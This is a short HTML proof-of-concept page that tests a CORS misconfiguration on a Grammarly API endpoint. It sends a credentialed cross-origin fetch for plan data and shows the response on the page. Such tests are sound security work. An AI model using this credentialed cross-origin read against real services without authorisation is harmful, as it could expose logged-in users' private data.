<!DOCTYPE html>
<html>
  <head>
    <title>Grammarly CORS PoC</title>
  </head>
  <body>
    <h1>Testing CORS...</h1>
    <script>
      fetch("https://goldengate.grammarly.com/vito/plans?specialOffers=pro_free_trial&countryCode=NG", {
        credentials: "include"
      })
      .then(res => res.json())
      .then(data => {
        document.body.innerHTML += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
      })
      .catch(err => {
        document.body.innerHTML += `<p style="color:red;">Error: ${err}</p>`;
      });
    </script>
  </body>
</html>
